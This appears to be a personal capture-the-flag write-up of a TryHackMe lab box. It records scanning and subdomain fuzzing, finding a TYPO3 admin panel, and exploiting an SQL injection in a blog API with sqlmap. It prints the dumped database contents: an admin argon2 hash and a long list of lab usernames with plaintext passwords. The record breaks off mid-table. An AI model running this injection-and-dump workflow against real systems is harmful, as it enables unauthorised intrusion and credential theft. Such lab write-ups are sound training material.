# Enumeration
## ping scan
```zsh
    ~/Documents/THM/CTFs/Endgame ▓▒░ ping 10.10.8.16                                                              ░▒▓ ✔ 
PING 10.10.8.16 (10.10.8.16) 56(84) bytes of data.
64 bytes from 10.10.8.16: icmp_seq=1 ttl=63 time=55.4 ms
64 bytes from 10.10.8.16: icmp_seq=2 ttl=63 time=55.7 ms
^C
--- 10.10.8.16 ping statistics ---
3 packets transmitted, 2 received, 33.3333% packet loss, time 2003ms
rtt min/avg/max/mdev = 55.441/55.547/55.653/0.106 ms

```
Notes: Host is up
## nmap scan
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bb:2e:e6:cc:79:f4:7d:68:2c:11:bc:4b:63:19:08:af (RSA)
|   256 80:61:bf:8c:aa:d1:4d:44:68:15:45:33:ed:eb:82:a7 (ECDSA)
|_  256 87:86:04:e9:e0:c0:60:2a:ab:87:8e:9b:c7:05:35:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.28 seconds
```
Notes:
- 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
- 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
- OS: Linux; CPE: cpe:/o:linux:linux_kernel
## http site visit
```html
Our services are accessible only through the vulnnet.thm domain!
```
### /etc/host add
```zsh
    ~/Documents/THM/CTFs/Endgame ▓▒░ cat /etc/hosts                                                    ░▒▓ ✔ 
127.0.0.1	localhost
127.0.0.1       mx
10.10.8.16	vulnnet.thm
```
Notes: added domain name to hosts list
### website check
```html
<!DOCTYPE html>
<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
	<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Soon &mdash; Fully Responsive Software Design by VulnNet</title>
	<meta name="viewport" content="width=device-width, initial-scale=1">

  	<!-- Facebook and Twitter integration -->
	<meta property="og:title" content=""/>
	<meta property="og:image" content=""/>
	<meta property="og:url" content=""/>
	<meta property="og:site_name" content=""/>
	<meta property="og:description" content=""/>
	<meta name="twitter:title" content="" />
	<meta name="twitter:image" content="" />
	<meta name="twitter:url" content="" />
	<meta name="twitter:card" content="" />

	<!-- <link href='https://fonts.googleapis.com/css?family=Work+Sans:400,300,600,400italic,700' rel='stylesheet' type='text/css'> -->
	<link href="[https://fonts.googleapis.com/css?family=Space+Mono](view-source:https://fonts.googleapis.com/css?family=Space+Mono)" rel="stylesheet">
	
	<!-- Animate.css -->
	<link rel="stylesheet" href="[css/animate.css](view-source:http://vulnnet.thm/css/animate.css)">
	<!-- Icomoon Icon Fonts-->
	<link rel="stylesheet" href="[css/icomoon.css](view-source:http://vulnnet.thm/css/icomoon.css)">
	<!-- Bootstrap  -->
	<link rel="stylesheet" href="[css/bootstrap.css](view-source:http://vulnnet.thm/css/bootstrap.css)">
	<!-- Theme style  -->
	<link rel="stylesheet" href="[css/style.css](view-source:http://vulnnet.thm/css/style.css)">

	<!-- Modernizr JS -->
	<script src="[js/modernizr-2.6.2.min.js](view-source:http://vulnnet.thm/js/modernizr-2.6.2.min.js)"></script>
	<!-- FOR IE9 below -->
	<!--[if lt IE 9]>
	<script src="js/respond.min.js"></script>
	<![endif]-->

	</head>
	<body>
		
	<div class="fh5co-loader"></div>
	
	<div id="page">

	<div id="fh5co-container" class="js-fullheight">
		<div class="countdown-wrap js-fullheight">
			<div class="row">
				<div class="col-md-12 text-center">
					<div class="display-t js-fullheight">
						<div class="display-tc animate-box">
							<nav class="fh5co-nav" role="navigation">
								<div id="fh5co-logo"><a href="[index.html](view-source:http://vulnnet.thm/index.html)">Soon<strong>.</strong></a></div>
							</nav>
							<h1>We Are Coming Soon!</h1>
							<h2>New User Experience Delivered by <a href="[#](view-source:http://vulnnet.thm/?#)">VulnNet Entertainment</a></h2>
							<div class="simply-countdown simply-countdown-one"></div>
							<div class="row">
								<div class="col-md-12 desc">
									<h2>Our webiste is opening soon. <br> Please register to notify you when it's ready!</h2>
									<form class="form-inline" id="fh5co-header-subscribe">
										<div class="col-md-12 col-md-offset-0">
											<div class="form-group">
												<input type="text" class="form-control" id="email" placeholder="Get notify by email">
												<button type="submit" class="btn btn-primary">Subscribe</button>
											</div>
										</div>
									</form>
									<ul class="fh5co-social-icons">
										<li><a href="[#](view-source:http://vulnnet.thm/?#)"><i class="icon-twitter-with-circle"></i></a></li>
										<li><a href="[#](view-source:http://vulnnet.thm/?#)"><i class="icon-facebook-with-circle"></i></a></li>
										<li><a href="[#](view-source:http://vulnnet.thm/?#)"><i class="icon-linkedin-with-circle"></i></a></li>
										<li><a href="[#](view-source:http://vulnnet.thm/?#)"><i class="icon-dribbble-with-circle"></i></a></li>
									</ul>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="bg-cover js-fullheight" style="background-image:url(images/workspace.jpg);">
			
		</div>
	</div>
	</div>

	<div class="gototop js-top">
		<a href="[#](view-source:http://vulnnet.thm/?#)" class="js-gotop"><i class="icon-arrow-up"></i></a>
	</div>
	
	<!-- jQuery -->
	<script src="[js/jquery.min.js](view-source:http://vulnnet.thm/js/jquery.min.js)"></script>
	<!-- jQuery Easing -->
	<script src="[js/jquery.easing.1.3.js](view-source:http://vulnnet.thm/js/jquery.easing.1.3.js)"></script>
	<!-- Bootstrap -->
	<script src="[js/bootstrap.min.js](view-source:http://vulnnet.thm/js/bootstrap.min.js)"></script>
	<!-- Waypoints -->
	<script src="[js/jquery.waypoints.min.js](view-source:http://vulnnet.thm/js/jquery.waypoints.min.js)"></script>

	<!-- Count Down -->
	<script src="[js/simplyCountdown.js](view-source:http://vulnnet.thm/js/simplyCountdown.js)"></script>
	<!-- Main -->
	<script src="[js/main.js](view-source:http://vulnnet.thm/js/main.js)"></script>

	<script>
    var d = new Date(new Date().getTime() + 1000 * 120 * 120 * 2000);
    // default example
    simplyCountdown('.simply-countdown-one', {
        year: d.getFullYear(),
        month: d.getMonth() + 1,
        day: d.getDate()
    });
    //jQuery example
    $('#simply-countdown-losange').simplyCountdown({
        year: d.getFullYear(),
        month: d.getMonth() + 1,
        day: d.getDate(),
        enableUtc: false
    });
</script>

	</body>
</html>
```
Notes: 
- Technologies used:
	Font scripts: Google Font API
	Miscellaneous: Open Graph
	Web servers: Apache 2.4.29
	Operating systems: Ubuntu
	JavaScript libraries:	jQuery 2.1.4 & Modernizr 2.6.2	
	UI frameworks: Bootstrap 3.3.5
## Nikto Scan
```
    ~/Documents/THM/CTFs/Endgame ▓▒░ nikto -host vulnnet.thm                                           ░▒▓ ✔ 
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.8.16
+ Target Hostname:    vulnnet.thm
+ Target Port:        80
+ Start Time:         2022-10-22 20:25:10 (GMT3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x10fa 0x5e07a2716f080 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET 
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6544 items checked: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2022-10-22 20:31:22 (GMT3) (372 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
## ffuf scan
```zsh
ffuf -u http://vulnnet.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.vulnnet.thm' -fs 0 -fs 65 -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://vulnnet.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.vulnnet.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: 65
________________________________________________

blog                    [Status: 200, Size: 19314, Words: 1236, Lines: 391]
shop                    [Status: 200, Size: 26700, Words: 11619, Lines: 525]
api                     [Status: 200, Size: 18, Words: 4, Lines: 1]
admin1                  [Status: 307, Size: 0, Words: 1, Lines: 1]
:: Progress: [4989/4989] :: Job [1/1] :: 712 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```
Notes:
- blog.vulnnet.thm
- shop.vulnnet.thm
- api.vulnnet.thm
- admin1.vulnnet.thm
## /etc/host
```
10.10.41.89	vulnnet.thm
10.10.41.89	blog.vulnnet.thm
10.10.41.89	shop.vulnnet.thm
10.10.41.89	api.vulnnet.thm
10.10.41.89	admin1.vulnnet.thm
```
Notes: added the new domain names
## ffuf directory scan
```zsh
ffuf -u http://admin1.vulnnet.thm/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt     

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://admin1.vulnnet.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

en                      [Status: 301, Size: 321, Words: 20, Lines: 10]
fileadmin               [Status: 301, Size: 328, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 283, Words: 20, Lines: 10]
typo3                   [Status: 301, Size: 324, Words: 20, Lines: 10]
typo3conf               [Status: 301, Size: 328, Words: 20, Lines: 10]
typo3temp               [Status: 301, Size: 328, Words: 20, Lines: 10]
vendor                  [Status: 301, Size: 325, Words: 20, Lines: 10]
:: Progress: [20476/20476] :: Job [1/1] :: 246 req/sec :: Duration: [0:01:23] :: Errors: 80 ::
```
Notes: 
- http://admin1.vulnnet.thm/fileadmin: no access through browser 
```html
Curl returns:
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://admin1.vulnnet.thm/fileadmin/">here</a>.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at admin1.vulnnet.thm Port 80</address>
</body></html>
```
- http://admin1.vulnnet.thm/typo3/: access to Typo3 CMS
	- ![[Pasted image 20221023223449.png]]
# Weaponization
## searchsploit
```zsh
    ~/Documents/THM/CTFs/Endgame ▓▒░ searchsploit typo3                                               ░▒▓ ✔ 
[i] Found (#2): /opt/exploit-database/files_exploits.csv
[i] To remove this message, please edit "/opt/exploit-database/.searchsploit_rc" for "files_exploits.csv" (package_array: exploitdb)

[i] Found (#2): /opt/exploit-database/files_shellcodes.csv
[i] To remove this message, please edit "/opt/exploit-database/.searchsploit_rc" for "files_shellcodes.csv" (package_array: exploitdb)

----------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                               |  Path
----------------------------------------------------------------------------- ---------------------------------
TYPO3 - Arbitrary File Retrieval                                             | php/webapps/15856.php
Typo3 - File Disclosure                                                      | php/webapps/17905.txt
Typo3 3.5 b5 - 'showpic.php' File Enumeration                                | php/webapps/22297.pl
Typo3 3.5 b5 - 'Translations.php' Remote File Inclusion                      | php/webapps/22298.txt
Typo3 3.5 b5 - HTML Hidden Form Field Information Disclosure (1)             | php/webapps/22315.pl
Typo3 3.5 b5 - HTML Hidden Form Field Information Disclosure (2)             | php/webapps/22316.pl
Typo3 3.7/3.8/4.0 - 'Class.TX_RTEHTMLArea_PI1.php' Multiple Remote Command E | php/webapps/29300.txt
Typo3 4.5 < 4.7 - Remote Code Execution / Local File Inclusion / Remote File | php/webapps/18308.txt
TYPO3 < 4.0.12/4.1.10/4.2.6 - 'jumpUrl' Remote File Disclosure               | php/webapps/8038.py
TYPO3 CMS 4.0 - 'showUid' SQL Injection                                      | php/webapps/9380.txt
Typo3 CMW_Linklist 1.4.1 Extension - SQL Injection                           | php/webapps/25186.txt
TYPO3 Extension Akronymmanager 0.5.0 - SQL Injection                         | php/webapps/37301.txt
Typo3 Extension JobControl 2.14.0 - Cross-Site Scripting / SQL Injection     | php/webapps/34800.txt
TYPO3 Extension ke DomPDF - Remote Code Execution                            | php/webapps/35443.txt
TYPO3 Extension News - SQL Injection                                         | php/webapps/41940.py
TYPO3 Extension Restler 1.7.0 - Local File Disclosure                        | php/webapps/42985.txt
WordPress Plugin TYPO3 't3m_cumulus_tagcloud' Extension 1.0 - HTML Injection | multiple/webapps/33937.txt
----------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
Notes: I need to find the veresion
## Typo3Scan
```zsh
git clone https://github.com/whoot/Typo3Scan.git
```
Notes: no results, the script was not able to identify the version.
## fuzzing the blog site
Post: http://blog.vulnnet.thm/post1.php > inspect elements > network > check: http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 > Response:
```js
request_id "1"
blog_id "1"
titles "Windows Search Vulnerability Can be Abused to Deliver"
status "posted"
```
Notes: mysql database.
```js
request_id "9999 or 1=1"
blog_id "1"
titles "Windows Search Vulnerability Can be Abused to Deliver"
status "posted"
```
Notes: mysqlp injection.
## sqlmap
### grabbing the banner
```zsh
sqlmap -u 'http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1' -b

[23:30:41] [INFO] the back-end DBMS is MySQL
[23:30:41] [INFO] fetching banner
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL >= 5.0.12
banner: '5.7.38-0ubuntu0.18.04.1'
```
Notes: my sqlmap version is outdated so I had to install from their repo
### enumerating the database
```zsh
python3 sqlmap.py --dbms=mysql -u 'http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1' --batch --dbs
[23:54:38] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[23:54:38] [INFO] fetching database names
available databases [3]:
[*] blog
[*] information_schema
[*] vn_admin
```
### enumerating tables
#### vn_admin
##### DB: vn_admin be_users table enum
```sh
python3 sqlmap.py --dbms=mysql -u 'http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1' -D vn_admin -T be_users --dump --batch
[00:18:56] [INFO] fetching entries for table 'be_users' in database 'vn_admin'
Database: vn_admin
Table: be_users
[1 entry]
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
...
base64:type251:MXlwYnlrYXlwYnlrYTB5cGJ5a2ExNjU1MjI2Nzg5eXBieWthMHlwYnlrYTB5cGJ5a2EweXBieWth\nMHlwYnlrYTB5cGJ5a2FjaHJpc193QHZ1bG5uZXQudGhteXBieWthMHlwYnlrYXlwYnlrYTE2NTUy\nMjY4MTB5cGJ5a2F5cGJ5a2EweXBieWthJGFyZ29uMmkkdj0xOSRtPTY1NTM2LHQ9MTYscD0yJFVu\nbFZTRWd5TVVGblluSlhOWGxYZGckajZ6M0lzaG1qc04rQ3doY2lSRUNWMk5BclF3aXBxUU1JQnRZ\ndWZ5TTRSZ3lwYnlrYTB5cGJ5a2F5cGJ5a2EweXBieWthMTY1NTIyNjc4OXlwYnlrYWE6MTQ6e3M6\nMTQ6ImludGVyZmFjZVNldHVwIjtzOjc6ImJhY2tlbmQiO3M6MTA6Im1vZHVsZURhdGEiO2E6MTp7
...
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```
Notes: eye-damaging nonsense.
##### DB:  vn_admin be_users table columns enum
```sh
python3 sqlmap.py --dbms=mysql -u 'http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1' -D vn_admin -T be_users --column --batch
[00:20:02] [INFO] fetching columns for table 'be_users' in database 'vn_admin'
Database: vn_admin
Table: be_users
[34 columns]
+-----------------------+----------------------+
| Column                | Type                 |
+-----------------------+----------------------+
| admin                 | smallint(5) unsigned |
| allowed_languages     | varchar(255)         |
| avatar                | int(10) unsigned     |
| category_perms        | text                 |
| crdate                | int(10) unsigned     |
| createdByAction       | int(11)              |
| cruser_id             | int(10) unsigned     |
| db_mountpoints        | text                 |
| deleted               | smallint(5) unsigned |
| description           | text                 |
| disable               | smallint(5) unsigned |
| disableIPlock         | smallint(5) unsigned |
| email                 | varchar(255)         |
| endtime               | int(10) unsigned     |
| file_mountpoints      | text                 |
| file_permissions      | text                 |
| lang                  | varchar(6)           |
| lastlogin             | int(10) unsigned     |
| lockToDomain          | varchar(50)          |
| options               | smallint(5) unsigned |
| password              | varchar(100)         |
| pid                   | int(10) unsigned     |
| realName              | varchar(80)          |
| starttime             | int(10) unsigned     |
| TSconfig              | text                 |
| tstamp                | int(10) unsigned     |
| uc                    | mediumblob           |
| uid                   | int(10) unsigned     |
| usergroup             | varchar(255)         |
| usergroup_cached_list | text                 |
| userMods              | text                 |
| username              | varchar(50)          |
| workspace_id          | int(11)              |
| workspace_perms       | smallint(6)          |
+-----------------------+----------------------+
```
Notes: Interesting column we have got:
- | admin                 | smallint(5) unsigned |
- | password              | varchar(100)         |
- | username              | varchar(50)          |
##### DB: vn_admin T: be_users C: admin
```sh
python3 sqlmap.py --dbms=mysql -u 'http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1' -D vn_admin -T be_users -C admin --dump --batch
[00:27:21] [INFO] fetching entries of column(s) 'admin' for table 'be_users' in database 'vn_admin'
[00:27:21] [WARNING] reflective value(s) found and filtering out
Database: vn_admin
Table: be_users
[1 entry]
+-------+
| admin |
+-------+
| 1     |
+-------+
```
##### DB: vn_admin T: be_users C:  password
```sh
python3 sqlmap.py --dbms=mysql -u 'http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1' -D vn_admin -T be_users -C password --dump --batch
[00:27:33] [INFO] fetching entries of column(s) 'password' for table 'be_users' in database 'vn_admin'
[00:27:33] [WARNING] reflective value(s) found and filtering out
Database: vn_admin
Table: be_users
[1 entry]
+---------------------------------------------------------------------------------------------------+
| password                                                                                          |
+---------------------------------------------------------------------------------------------------+
| $argon2i$v=19$m=65536,t=16,p=2$UnlVSEgyMUFnYnJXNXlXdg$j6z3IshmjsN+CwhciRECV2NArQwipqQMIBtYufyM4Rg |
+---------------------------------------------------------------------------------------------------+
```
Notes: we have a hash, will crack it after enumerating further.
Hash: $argon2i$v=19$m=65536,t=16,p=2$UnlVSEgyMUFnYnJXNXlXdg$j6z3IshmjsN+CwhciRECV2NArQwipqQMIBtYufyM4Rg'
##### DB: vn_admin T: be_users C:  username
```sh
python3 sqlmap.py --dbms=mysql -u 'http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1' -D vn_admin -T be_users -C username --dump --batch
[00:27:42] [INFO] fetching entries of column(s) 'username' for table 'be_users' in database 'vn_admin'
[00:27:42] [WARNING] reflective value(s) found and filtering out
Database: vn_admin
Table: be_users
[1 entry]
+----------+
| username |
+----------+
| chris_w  |
+----------+
```
Notes: Username: chris_w
Notes: password list has been modified for hash cracking
```zsh
python3 sqlmap.py --dbms=mysql -u 'http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1' -D vn_admin --tables --batch
[23:58:43] [INFO] fetching tables for database: 'vn_admin'
Database: vn_admin
[48 tables]
+---------------------------------------------+
| backend_layout                              |
| be_dashboards                               |
| be_groups                                   |
| be_sessions                                 |
| be_users                                    |
| cache_adminpanel_requestcache               |
| cache_adminpanel_requestcache_tags          |
| cache_hash                                  |
| cache_hash_tags                             |
| cache_imagesizes                            |
| cache_imagesizes_tags                       |
| cache_pages                                 |
| cache_pages_tags                            |
| cache_pagesection                           |
| cache_pagesection_tags                      |
| cache_rootline                              |
| cache_rootline_tags                         |
| cache_treelist                              |
| fe_groups                                   |
| fe_sessions                                 |
| fe_users                                    |
| pages                                       |
| sys_be_shortcuts                            |
| sys_category                                |
| sys_category_record_mm                      |
| sys_collection                              |
| sys_collection_entries                      |
| sys_file                                    |
| sys_file_collection                         |
| sys_file_metadata                           |
| sys_file_processedfile                      |
| sys_file_reference                          |
| sys_file_storage                            |
| sys_filemounts                              |
| sys_history                                 |
| sys_language                                |
| sys_lockedrecords                           |
| sys_log                                     |
| sys_news                                    |
| sys_note                                    |
| sys_redirect                                |
| sys_refindex                                |
| sys_registry                                |
| sys_template                                |
| tt_content                                  |
| tx_extensionmanager_domain_model_extension  |
| tx_extensionmanager_domain_model_repository |
| tx_impexp_presets                           |
+---------------------------------------------+
```
Notes: will get back to this after obtaining tables from the blog database
#### blog
```zsh
python3 sqlmap.py --dbms=mysql -u 'http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1' -D blog --tables --batch
[00:02:36] [INFO] fetching tables for database: 'blog'
[00:02:36] [WARNING] reflective value(s) found and filtering out
Database: blog
[4 tables]
+------------+
| blog_posts |
| details    |
| metadata   |
| users      |
+------------+
```
Notes: users table seems interesting, I don't think that I need to get back to  vn_admin tables 

##### DB: blog users table enum
```sh
python3 sqlmap.py --dbms=mysql -u 'http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1' -D blog -T users --dump --batch
[00:06:48] [INFO] fetching entries for table 'users' in database 'blog'
Database: blog
Table: users
[651 entries]
+-----+---------------------+--------------------+
| id  | password            | username           |
+-----+---------------------+--------------------+
[00:06:48] [WARNING] console output will be trimmed to last 256 rows due to large table size
| 396 | D8Gbl8mnxg          | lspikinsaz         |
| 397 | kLLxorKfd           | profeb0            |
| 398 | cdXAJAR             | sberrymanb1        |
| 399 | 0hdeFiZBRJ          | ajefferiesb2       |
| 400 | 6rl6qXSJDrr         | hkibblewhiteb3     |
| 401 | DuYMuI              | dtremayneb4        |
| 402 | fwbk0Vgo            | bflewinb5          |
| 403 | 92Fb3vBF5k75        | kmolineuxb6        |
| 404 | zzh9wheBjX          | fjosefsb7          |
| 405 | sAGTlyBrb5r         | tmiskellyb8        |
| 406 | 3uUPdL              | nallrightb9        |
| 407 | fp2LW0x             | hlevermoreba       |
| 408 | IKhg7D              | celgerbb           |
| 409 | Tjyu2Ch2            | frustedbc          |
| 410 | NgKgdeKRVEK         | imeneghibd         |
| 411 | wGWMg3d             | vgouninbe          |
| 412 | ruTxBc2n85          | cbartoschbf        |
| 413 | ZydELwZFV2          | lcordonbg          |
| 414 | ROfVmvZSYS          | dappsbh            |
| 415 | B4SBGt5yAD          | zduchanbi          |
| 416 | zhE95JJX9l          | jfraybj            |
| 417 | nXSVHhVW9S          | mlanchesterbk      |
| 418 | NCeU070             | cgylesbl           |
| 419 | WzkvfoedkXJx        | cbonnifacebm       |
| 420 | ktPBpK1             | btoppasbn          |
| 421 | 8fCXE6BF9gj         | mdurrettbo         |
| 422 | cSAjOy              | skilroybp          |
| 423 | HLUHZ9oQ            | uvonderemptenbq    |
| 424 | gTc7TiSsd2          | dvinsenbr          |
| 425 | 7yQ0b1B             | ltiltbs            |
| 426 | SXD1eC6ysa          | dsimcoebt          |
| 427 | bgb084kq            | wfrailbu           |
| 428 | NsJFz4DLpI          | lmityukovbv        |
| 429 | 7JVPatN             | vkellarbw          |
| 430 | yuTnSPEvIoJ4        | rkingstonbx        |
| 431 | L3ttm8              | rbakewellby        |
| 432 | vyae6t              | dbousteadbz        |
| 433 | iA4AD4UlcLF1        | vstaddenc0         |
| 434 | VlyIAh              | rwhacketc1         |
| 435 | IpsnIEbIaT          | tnoorc2            |
| 436 | UPU9rZu8q           | dduffync3          |
| 437 | xuUXUFXoc           | dstichelc4         |
| 438 | yTuqouj9ZK          | kcleverlyc5        |
| 439 | QDneobZ1DH          | sreinertc6         |
| 440 | OdrnoHtrP           | mcottinghamc7      |
| 441 | c3KvR6              | ljansemac8         |
| 442 | GMbFP9              | acodac9            |
| 443 | zIZ11OPuj           | rhuggardca         |
| 444 | XCX2GVx             | gkeechcb           |
| 445 | nJQgYR2uOyZq        | syurincc           |
| 446 | AQlFlPvf            | agaulecd           |
| 447 | zj6vR6Bf            | wboijce            |
| 448 | eL5uJnLD2           | kphifercf          |
| 449 | 7HEMdTc07           | abenglecg          |
| 450 | VbzVZoYn            | emarkingch         |
| 451 | wln8WN3PJ           | nmuldowneyci       |
| 452 | 3AcKBTHRN           | jbygrovecj         |
| 453 | 32ZXql9Uw8          | bduxburyck         |
| 454 | 2pnBsk6i            | fthewcl            |
| 455 | JxcEXKAN            | kmeececm           |
| 456 | rkyCMLwOIt          | bholligancn        |
| 457 | KlxQ4Vxl            | bferonetco         |
| 458 | OFc5f2              | jcraycp            |
| 459 | SsLMTxbw            | hethertoncq        |
| 460 | nUpdnCZW1cqr        | cclayecr           |
| 461 | 0I7ldSNbm           | tmcbreartycs       |
| 462 | gqQeawiZ            | oderuggieroct      |
| 463 | djQBjW3pk           | rdoerscu           |
| 464 | G9FarmKd            | karbucklecv        |
| 465 | lXCoFI              | bbuckbycw          |
| 466 | WAMRuFTTI3          | ldixseecx          |
| 467 | diVq6PDeEpz         | jmahedycy          |
| 468 | bV6cXPOFfLg         | gdamrellcz         |
| 469 | dCrF5fv             | sgarrettd0         |
| 470 | Q4gYmlM             | plaurenceaud1      |
| 471 | SnvFrSB6AB          | kmcgeacheyd2       |
| 472 | qiehVyQ             | mhopewelld3        |
| 473 | At9A4aCJos          | chottond4          |
| 474 | 8T9v08352re         | hsellandd5         |
| 475 | y8chyGC9js          | syegorkovd6        |
| 476 | ghMz6e68c1Z         | adavisond7         |
| 477 | 00S7q8S1f8W         | amewisd8           |
| 478 | 2rruluVz0SwY        | lorpind9           |
| 479 | hXaVYfHUZoz         | jbilovskyda        |
| 480 | j7GAP4v             | jhalforddb         |
| 481 | 0MM46yTEVBL2        | wcolisbedc         |
| 482 | QUDViFUxO           | cgreastydd         |
| 483 | YGcBpM              | ajackde            |
| 484 | 2js9AM              | cmcgarritydf       |
| 485 | oJ38KUXgm           | tjostdg            |
| 486 | KP9DmIk             | lguidendh          |
| 487 | qNYURfhw            | mbletsodi          |
| 488 | jDmbnZJi            | wsneesbydj         |
| 489 | t8xlAuAvH8Yj        | glerouxdk          |
| 490 | TTin1up             | yhaythornthwaitedl |
| 491 | 0ftVkbqP            | nzmitrovichdm      |
| 492 | Kwcozh              | jgodballdn         |
| 493 | TWnwDTB             | jkiddeydo          |
| 494 | IxQgXLrw            | acaghandp          |
| 495 | AxuOsAA0lqrc        | rattestonedq       |
| 496 | GCpyVf              | mmichallatdr       |
| 497 | YnPCjKg             | rgaitoneds         |
| 498 | NOYhOlnC            | krobbekedt         |
| 499 | pjSBcAVD            | nknollerdu         |
| 500 | 5RigTGe             | wshemeltdv         |
| 501 | jwKMTMu             | rpeperelldw        |
| 502 | 4qfwbKNed3I         | lbescobydx         |
| 503 | qSX9N1Kf8XJ         | jparishdy          |
| 504 | AoIrka              | jminghidz          |
| 505 | Ft4xVROXXCd5        | nforthe0           |
| 506 | x3WIaoX99yb         | tklemensiewicze1   |
| 507 | hXcrFv              | epotterye2         |
| 508 | 6ZtJhp4col          | lbrugmanne3        |
| 509 | bqItfg4wf           | adencse4           |
| 510 | 5W4lM81DPo          | cfloreze5          |
| 511 | IT6p5HT             | amatanine6         |
| 512 | 0Q6T9jvAZB          | fchalkere7         |
| 513 | M7lvtAz6oRNS        | rytere8            |
| 514 | MpO7FgPoz           | cstillee9          |
| 515 | 8rIuhW0VZ           | cbashamea          |
| 516 | OS15i4              | flyeseb            |
| 517 | Usl7mH2H            | gtieryec           |
| 518 | WDAliOAKFj7f        | sborgheseed        |
| 519 | iwpk0YC             | hmctrustyee        |
| 520 | lN8d6g1             | wvigeref           |
| 521 | nuwPbeTIgX8F        | nbockeneg          |
| 522 | LvBDyc9JRPV         | ffranzmaneh        |
| 523 | ncpiXJX             | drippingaleei      |
| 524 | vQUTz2xEyWx4        | achambersej        |
| 525 | wQcbURC             | fsuarezek          |
| 526 | irTEDl2k            | kaspoleel          |
| 527 | H6WyTMdy            | mmursellem         |
| 528 | pukixtg             | szecchinellien     |
| 529 | Or6dtgSGmd          | cnewlineo          |
| 530 | VhkvlZO             | cmccrowep          |
| 531 | slncO0kvmb          | shavershameq       |
| 532 | svJ4749mzdJ         | jtumeltyer         |
| 533 | weR5eukJOX6C        | cmathivates        |
| 534 | rp8sqUpw            | btarzeyet          |
